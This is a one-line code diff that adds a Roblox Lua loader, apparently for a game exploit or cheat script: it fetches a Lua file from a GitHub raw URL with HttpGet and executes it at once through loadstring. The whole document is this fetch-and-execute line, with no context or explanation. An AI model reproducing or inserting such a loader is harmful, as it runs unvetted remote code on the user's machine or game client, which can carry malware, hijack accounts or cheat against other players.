@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/runaways-beta-spam1-47v1sxpto169wq.lua"))()
